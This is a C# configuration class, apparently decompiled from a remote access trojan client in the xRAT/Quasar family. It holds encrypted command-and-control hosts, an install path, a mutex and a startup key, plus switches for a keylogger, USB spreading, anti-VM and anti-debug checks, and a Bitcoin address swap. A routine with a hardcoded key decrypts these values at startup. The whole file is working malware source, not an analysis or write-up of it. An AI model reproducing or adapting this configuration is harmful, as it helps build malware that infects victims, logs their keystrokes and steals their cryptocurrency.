using System;
using xClient.Core.Cryptography;
using xClient.Core.Helper;

namespace xClient.Config;

public static class Settings
{
	public static string VERSION = "djaufnsZPXCTasSDdRAq9oV2OsTlyW81QGgrabKpP7RkZL0ZpaBiPsyLPx+Fn6e2TkYnt5iDql1J/UJPuWwPgQ==";

	public static string HOSTS = "8niCUDkOI91Z4Z31hO2YMe/hvv7yqb5E1kC2aoM1tKw7SbX1PRyu9nA9681naK3a7cDLY9S+gOD504e9NSrur7gFpOW2sd5fF5xQ/bbNdMY=";

	public static int RECONNECTDELAY = 3000;

	public static string KEY = "TCebLg9CdiEXqQ0GjyaJGQ==";

	public static string AUTHKEY = "4sQAVWlRbATJaU9bJrpGclS3/uRE5VNZaxCN6r90H1Hn0TKijy0ZDqzcEDxhruEST+7vsKILdCBPDl113PyxsA==";

	public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.SystemX86;

	public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);

	public static string SUBDIRECTORY = "S2wab+2Q+MYcEeYuLmjbAyeJujNB54S+sbSnT0stXyU9GZrbhzGDLTkbYQ/WNDdLK7Go6PIeWuXn1q2ChvRvtg==";

	public static string INSTALLNAME = "RvJEbakGXXts2Q3amnxpN9g9Qa1nQ4oc0RXYq4vr66wpPcrp2bUqKBiFyMFoAVvf578n6wdScQoONN5yKyTMcQ==";

	public static bool INSTALL = true;

	public static bool STARTUP = true;

	public static string MUTEX = "eqEtm/fvVPhbQ7djg6wVb9w5kZTSXrDGBAJ03r8JeNAHk8bC7JVHGLCdTMIH8HmNw8Y5U7eZE4Q83Yenr/LMdZBTIQbEqeJ7K0kLI0mFJ4g=";

	public static string STARTUPKEY = "gdolYP8nGns1lglHEkkNOgU929nY3aDAhYPWSb1gJKIs7srue7RJlOXfeGDOHrHYlCAKEE5ICJQrOGWLZOi4GA==";

	public static bool HIDEFILE = false;

	public static bool ENABLELOGGER = true;

	public static string ENCRYPTIONKEY = "Evsz1MUHt03MunEDCgdu";

	public static string TAG = "fvPMEJ3e5QsIrUVSzwsTtKlqFnRHLfYQVZOMM86pZi4gg1xvW+5Q0UaWTTHXICZIZbElbLnVEyZrVAD+jWCZBg==";

	public static string LOGDIRECTORYNAME = "snEZsXcZgo/lWUNn5bNjOxoNGNjCJymD1ZuWJbsCifyoW8WDx/A9Pg/vAb+TjyauffuASMPK71//ST5bdk+kNg==";

	public static string USBSpreadNAME = "b3wZIKssd9X6hZSKW16Xy1U7cEEfXl6WrRFrH5AXu5yKKHIAWUn9ZIpeEA0AOzxROkCHzxtR5kborof6mlzZqw==";

	public static string BTCAddress = "x/ijJLq086UlIoE2xdvmtXwskoRB0/hH3PbTCkeTD/Cd74Lx2ETODBJf6KBa+PUmNgBJwu9+08hXu55ZCnNdTg==";

	public static bool HIDELOGDIRECTORY = true;

	public static bool HIDEINSTALLSUBDIRECTORY = false;

	public static bool ENABLEPERSISTENCE = false;

	public static bool ENABLEANTISANDBOXIE = false;

	public static bool ENABLEANTIVM = false;

	public static bool ENABLEUSBSPREAD = false;

	public static bool ANTIDEBUG = false;

	public static bool STARTUPPERSISTENCE = false;

	public static bool ENABLEBTCSWAP = false;

	public static bool Initialize()
	{
		if (string.IsNullOrEmpty(VERSION))
		{
			return false;
		}
		AES.SetDefaultKey(ENCRYPTIONKEY);
		TAG = AES.Decrypt(TAG);
		VERSION = AES.Decrypt(VERSION);
		HOSTS = AES.Decrypt(HOSTS);
		SUBDIRECTORY = AES.Decrypt(SUBDIRECTORY);
		INSTALLNAME = AES.Decrypt(INSTALLNAME);
		MUTEX = AES.Decrypt(MUTEX);
		STARTUPKEY = AES.Decrypt(STARTUPKEY);
		LOGDIRECTORYNAME = AES.Decrypt(LOGDIRECTORYNAME);
		USBSpreadNAME = AES.Decrypt(USBSpreadNAME);
		BTCAddress = AES.Decrypt(BTCAddress);
		FixDirectory();
		return true;
	}

	private static void FixDirectory()
	{
		if (!PlatformHelper.Is64Bit)
		{
			switch (SPECIALFOLDER)
			{
			case Environment.SpecialFolder.ProgramFilesX86:
				SPECIALFOLDER = Environment.SpecialFolder.ProgramFiles;
				break;
			case Environment.SpecialFolder.SystemX86:
				SPECIALFOLDER = Environment.SpecialFolder.System;
				break;
			}
			DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
		}
	}
}
